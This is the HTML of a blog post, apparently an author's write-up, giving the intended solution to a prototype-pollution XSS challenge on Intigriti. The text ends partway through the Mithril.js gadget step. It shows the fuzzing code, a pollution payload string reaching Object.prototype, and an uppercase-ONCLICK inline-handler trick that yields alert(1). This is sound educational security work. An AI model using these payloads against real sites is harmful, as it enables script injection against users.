@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="en">
+<head>
+    <meta charset="utf-8">
+<title>Revenge of Intigriti 0422 Challenge Author Writeup - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2022/05/02/intigriti-revenge-challenge-author-writeup/" rel="alternate" hreflang="zh-TW" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/">
+    
+
+
+
+
+
+    <meta name="description" content="Among the many web vulnerabilities, my favorite is prototype pollution. It can be powerful sometimes when you find a script gadget.  So, I decided to make an XSS challenge about prototype pollution.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Revenge of Intigriti 0422 Challenge Author Writeup">
+<meta property="og:url" content="https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="Among the many web vulnerabilities, my favorite is prototype pollution. It can be powerful sometimes when you find a script gadget.  So, I decided to make an XSS challenge about prototype pollution.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.huli.tw/img/intigriti-revenge-challenge-author-writeup/cover-en.png">
+<meta property="article:published_time" content="2022-05-02T00:20:16.000Z">
+<meta property="article:modified_time" content="2023-06-20T05:46:56.914Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/intigriti-revenge-challenge-author-writeup/cover-en.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="Revenge of Intigriti 0422 Challenge Author Writeup" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/en">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/en/archives">Archive</a>
+            
+            <a class="navbar-item "
+               href="/en/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/en/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table of Contents">
+                    Table of Contents
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#solution">1&nbsp;&nbsp;<b>Solution</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#step1-prototype-pollution-on-arrayprototype">1.1&nbsp;&nbsp;Step1. Prototype pollution on Array.prototype</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#step2-bypass-checkhost">1.2&nbsp;&nbsp;Step2. Bypass checkHost</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#step3-prototype-pollution-again">1.3&nbsp;&nbsp;Step3. Prototype pollution again</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#step4-find-prototype-pollution-gadget-in-mithriljs">1.4&nbsp;&nbsp;Step4. Find prototype pollution gadget in mithril.js</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#other-script-gadgets">2&nbsp;&nbsp;<b>Other script gadgets</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#unintendedfor-the-previous-one-not-revenge-challenge">3&nbsp;&nbsp;<b>Unintended(for the previous one, not revenge challenge)</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#1-unintended-but-fixed-solution">3.1&nbsp;&nbsp;#1 Unintended but fixed solution</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#2-unintended-but-not-fixed-solution">3.2&nbsp;&nbsp;#2 Unintended but not fixed solution</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#takeaways">4&nbsp;&nbsp;<b>Takeaways</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+               <a class="navbar-item" href="/2022/05/02/intigriti-revenge-challenge-author-writeup/">中文</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            Revenge of Intigriti 0422 Challenge Author Writeup
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2022-05-02T00:20:16.000Z" itemprop="datePublished">2 May 2022</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/en/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <img src="/img/intigriti-revenge-challenge-author-writeup/cover-en.png" style="display:none">
+
+<p>Among the many web vulnerabilities, my favorite is prototype pollution. It can be powerful sometimes when you find a script gadget. </p>
+<p>So, I decided to make an XSS challenge about prototype pollution.</p>
+<p>In April, the challenge I made was released on Intigriti, if you haven’t checked that one, here is the link: <a target="_blank" rel="noopener" href="https://challenge-0422.intigriti.io/">https://challenge-0422.intigriti.io/</a></p>
+<p>Making a good challenge is hard.</p>
+<p>I made a few mistakes. With the bugs I made, the challenge became much easier. To make up for it, I decided to make another one, called “The Revenge of Intigriti 0422 Challenge”.</p>
+<p>Below is the intended solution to the revenge challenge.</p>
+<p>Challenge URL: <a target="_blank" rel="noopener" href="https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422">https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422</a></p>
+<span id="more"></span>
+
+<h2><span id="solution">Solution</span></h2><p>TL;DR</p>
+<ol>
+<li>Pollute Array.prototype via <code>merge</code> function</li>
+<li>Bypass <code>checkHost()</code> and pollute Object.prototype via <code>merge</code> function </li>
+<li>Find a script gadget in Mithril.js</li>
+<li>XSS</li>
+</ol>
+<h3><span id="step1-prototype-pollution-on-arrayprototype">Step1. Prototype pollution on Array.prototype</span></h3><h3><span id="step2-bypass-checkhost">Step2. Bypass checkHost</span></h3><p>These two steps are the same as the previous one, you can find the detail in my previous writeup: <a href="https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/">Intigriti 0422 XSS Challenge Author Writeup</a></p>
+<h3><span id="step3-prototype-pollution-again">Step3. Prototype pollution again</span></h3><p>Starting from step3, it’s totally different from the previous one.</p>
+<p>For previous one, you can override <code>document.body.innerHTML</code> to achieve XSS. But it does not work anymore because of the patch:</p>
+<pre class="line-numbers language-none"><code class="language-none">- if (typeof data !&#x3D;&#x3D; &#39;string&#39;) return data
++ if (typeof data !&#x3D;&#x3D; &#39;string&#39;) data &#x3D; String(data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>What else can we do?</p>
+<p>At second merge call, we have <code>devSettings[&quot;root&quot;] = document.createElement(&#39;main&#39;)</code>, what can we do from a DOM element?</p>
+<p>The idea is, if we can find a property that <code>property.constructor.prototype</code> &#x3D;&#x3D;&#x3D; <code>Object.prototype</code> from this DOM element, we can pollute Object.prototype!</p>
+<p>How should we find such property? For me, I will try to start with either <code>document</code> or <code>window</code>, because it’s more likely to have it.</p>
+<p>First, we can get <code>window</code> object via <code>document.querySelector(&#39;main&#39;).ownerDocument.defaultView</code></p>
+<p><code>Object</code> is in the <code>protectedKeys</code>, so we can’t just pollute <code>ownerDocument.defaultView.Object.constructor.prototype.xxx</code>.</p>
+<p>It’s not a big problem, we can do a little fuzzing to find other properties to use:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> window<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span>constructor<span class="token punctuation">.</span>prototype <span class="token operator">===</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>On Chrome, it’s <code>styleMedia</code>, <code>webkitStorageInfo</code> and <code>chrome</code>.</p>
+<p>On Firefox, it’s <code>external</code> and <code>sidebar</code>.</p>
+<p>By using these properties, we can pollute <code>Object.prototype</code> on both Chrome and Firefox</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// firefox</span>
+settings<span class="token punctuation">[</span>root<span class="token punctuation">]</span><span class="token punctuation">[</span>ownerDocument<span class="token punctuation">]</span><span class="token punctuation">[</span>defaultView<span class="token punctuation">]</span><span class="token punctuation">[</span>external<span class="token punctuation">]</span><span class="token punctuation">[</span>constructor<span class="token punctuation">]</span><span class="token punctuation">[</span>prototype<span class="token punctuation">]</span><span class="token punctuation">[</span>autofocus<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>
+
+<span class="token comment">// chrome</span>
+settings<span class="token punctuation">[</span>root<span class="token punctuation">]</span><span class="token punctuation">[</span>ownerDocument<span class="token punctuation">]</span><span class="token punctuation">[</span>defaultView<span class="token punctuation">]</span><span class="token punctuation">[</span>chrome<span class="token punctuation">]</span><span class="token punctuation">[</span>constructor<span class="token punctuation">]</span><span class="token punctuation">[</span>prototype<span class="token punctuation">]</span><span class="token punctuation">[</span>autofocus<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It seesm complex, is there a simpler way? Yes!</p>
+<p>In JavaScript, every properties has a flag called <code>enumerable</code>, <code>for in</code> can only enumerate enumerable properties. If we want to get all the properties in an object, we should use <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyNames">Object.getOwnPropertyNames</a> instead.</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span>constructor<span class="token punctuation">.</span>prototype <span class="token operator">===</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>On Chrome, it’s:</p>
+<ol>
+<li>JSON</li>
+<li>Math</li>
+<li>Intl</li>
+<li>Reflect</li>
+<li>console</li>
+<li>CSS</li>
+<li>styleMedia</li>
+<li>webkitStorageInfo</li>
+<li>Atomics</li>
+<li>chrome</li>
+<li>WebAssembly</li>
+</ol>
+<p>On Firefox, it’s:</p>
+<ol>
+<li>JSON</li>
+<li>Math</li>
+<li>Intl</li>
+<li>Reflect</li>
+<li>Atomics</li>
+<li>WebAssembly</li>
+<li>CSS</li>
+<li>external</li>
+<li>sidebar</li>
+<li>netscape</li>
+<li>console</li>
+</ol>
+<p>If you see different results, it’s most likely because of the extension you have installed. For example, <code>web3</code> or <code>ethereum</code> if you have metamask installed.</p>
+<p>Anyway, we can use <code>JSON</code> to construct our payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">settings[root][ownerDocument][defaultView][JSON][constructor][prototype][autofocus]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3><span id="step4-find-prototype-pollution-gadget-in-mithriljs">Step4. Find prototype pollution gadget in mithril.js</span></h3><p>After we can pollute <code>Object.prototype</code>, we need to find a <a target="_blank" rel="noopener" href="https://github.com/BlackFan/client-side-prototype-pollution">script gadget</a> to achieve XSS, and it’s exactly the final step of this challenge: find a prototype pollution gadget in mithril.js.</p>
+<p>Mithril.js is not a big project, the codebase is relatively small. Although it may take some time, finding a gadget is definitely possible.</p>
+<p>There is a type of usage that can be vulnerable to prototype pollution:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+ <span class="token comment">// do something</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Why? Let’s see the following example:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">123</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+ console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token comment">// a</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>for in</code> also iterates the properties of <code>Object.prototype</code>.</p>
+<p>So, we can start by finding such pattern.</p>
+<p>Here is the part for setting the DOM attributes: <a target="_blank" rel="noopener" href="https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L728">https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L728</a></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">setAttrs</span><span class="token punctuation">(</span><span class="token parameter">vnode<span class="token punctuation">,</span> attrs<span class="token punctuation">,</span> ns</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> attrs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">setAttr</span><span class="token punctuation">(</span>vnode<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> attrs<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The key here is that <code>for in</code> has been used, which means our polluted properties will be there as well.</p>
+<p>Now, we know that we can pollute DOM attribute, so our goal is to use an inline event handler like <code>onfocus</code> to trigger XSS.</p>
+<p>Keep diving in to see what <code>setAttr</code> does: <a target="_blank" rel="noopener" href="https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L733">https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L733</a></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">setAttr</span><span class="token punctuation">(</span><span class="token parameter">vnode<span class="token punctuation">,</span> key<span class="token punctuation">,</span> old<span class="token punctuation">,</span> value<span class="token punctuation">,</span> ns</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">"key"</span> <span class="token operator">||</span> key <span class="token operator">===</span> <span class="token string">"is"</span> <span class="token operator">||</span> value <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token function">isLifecycleMethod</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>old <span class="token operator">===</span> value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isFormAttribute</span><span class="token punctuation">(</span>vnode<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> value <span class="token operator">!==</span> <span class="token string">"object"</span><span class="token punctuation">)</span> <span class="token keyword">return</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"o"</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"n"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">updateEvent</span><span class="token punctuation">(</span>vnode<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"xlink:"</span><span class="token punctuation">)</span> vnode<span class="token punctuation">.</span>dom<span class="token punctuation">.</span><span class="token function">setAttributeNS</span><span class="token punctuation">(</span><span class="token string">"http://www.w3.org/1999/xlink"</span><span class="token punctuation">,</span> key<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">"style"</span><span class="token punctuation">)</span> <span class="token function">updateStyle</span><span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>dom<span class="token punctuation">,</span> old<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hasPropertyKey</span><span class="token punctuation">(</span>vnode<span class="token punctuation">,</span> key<span class="token punctuation">,</span> ns<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">"value"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token comment">// Only do the coercion if we're actually going to check the value.</span>
+      <span class="token comment">/* eslint-disable no-implicit-coercion */</span>
+      <span class="token comment">//setting input[value] to same value by typing on focused element moves cursor to end in Chrome</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>tag <span class="token operator">===</span> <span class="token string">"input"</span> <span class="token operator">||</span> vnode<span class="token punctuation">.</span>tag <span class="token operator">===</span> <span class="token string">"textarea"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> vnode<span class="token punctuation">.</span>dom<span class="token punctuation">.</span>value <span class="token operator">===</span> <span class="token string">""</span> <span class="token operator">+</span> value <span class="token operator">&amp;&amp;</span> vnode<span class="token punctuation">.</span>dom <span class="token operator">===</span> <span class="token function">activeElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>
+      <span class="token comment">//setting select[value] to same value while having select open blinks select dropdown in Chrome</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>tag <span class="token operator">===</span> <span class="token string">"select"</span> <span class="token operator">&amp;&amp;</span> old <span class="token operator">!==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> vnode<span class="token punctuation">.</span>dom<span class="token punctuation">.</span>value <span class="token operator">===</span> <span class="token string">""</span> <span class="token operator">+</span> value<span class="token punctuation">)</span> <span class="token keyword">return</span>
+      <span class="token comment">//setting option[value] to same value while having select open blinks select dropdown in Chrome</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>tag <span class="token operator">===</span> <span class="token string">"option"</span> <span class="token operator">&amp;&amp;</span> old <span class="token operator">!==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> vnode<span class="token punctuation">.</span>dom<span class="token punctuation">.</span>value <span class="token operator">===</span> <span class="token string">""</span> <span class="token operator">+</span> value<span class="token punctuation">)</span> <span class="token keyword">return</span>
+      <span class="token comment">/* eslint-enable no-implicit-coercion */</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token comment">// If you assign an input type that is not supported by IE 11 with an assignment expression, an error will occur.</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>tag <span class="token operator">===</span> <span class="token string">"input"</span> <span class="token operator">&amp;&amp;</span> key <span class="token operator">===</span> <span class="token string">"type"</span><span class="token punctuation">)</span> vnode<span class="token punctuation">.</span>dom<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+    <span class="token keyword">else</span> vnode<span class="token punctuation">.</span>dom<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> value <span class="token operator">===</span> <span class="token string">"boolean"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span> vnode<span class="token punctuation">.</span>dom<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
+      <span class="token keyword">else</span> vnode<span class="token punctuation">.</span>dom<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span> vnode<span class="token punctuation">.</span>dom<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">"className"</span> <span class="token operator">?</span> <span class="token string">"class"</span> <span class="token operator">:</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>If a property name starts with <code>on</code>, <code>updateEvent</code> will be called and it takes a <code>function</code> as parameters, no way to inject a string handler. </p>
+<p>We can use <code>ON</code> instead of <code>on</code> to bypass this.</p>
+<p>Another thing we need to get around is this check: <code>hasPropertyKey(vnode, key, ns)</code></p>
+<p>If this returns true, it executes <code>vnode.dom[key] = value</code> in the end. It’s not what we want because <code>vnode.dom[&#39;ONCLICK&#39;] = &#39;alert(1)&#39;</code> makes no effect.</p>
+<p>The only way to add a inline event handler to the DOM element is to let <code>hasPropertyKey(vnode, key, ns)</code> failed and then run <code>vnode.dom.setAttribute(key === &quot;className&quot; ? &quot;class&quot; : key, value)</code>, for example:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>a</span><span class="token punctuation">></span></span>click me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+      <span class="token comment">// this works</span>
+      a<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'ONCLICK'</span><span class="token punctuation">,</span> <span class="token string">'alert(1)'</span><span class="token punctuation">)</span>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
